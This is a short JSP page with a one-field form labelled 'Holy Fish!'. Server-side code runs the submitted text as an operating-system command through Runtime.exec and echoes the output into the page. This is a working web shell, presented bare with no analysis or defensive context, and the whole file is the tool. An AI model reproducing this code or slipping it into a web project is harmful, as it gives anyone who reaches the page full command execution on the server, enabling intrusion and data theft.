<%@ page import="java.util.*,java.io.*"%> 
<!DOCTYPE html>
<html>
<body>
<form method="POST" name="frm">
<input type="text" name="x" id="x" />
<input type="submit" value="Holy Fish!" />
</form>
<div>
<pre> 
<% 	
if (request.getParameter("x") != null) 
{
	Process p = Runtime.getRuntime().exec(request.getParameter("x")); 
	DataInputStream dis = new DataInputStream(p.getInputStream()); 
	String disr = dis.readLine();
	while (disr != null) { 
		out.println(disr);
		disr = dis.readLine();
}
}
%> 
</pre> 
</div>
</body>
</html>
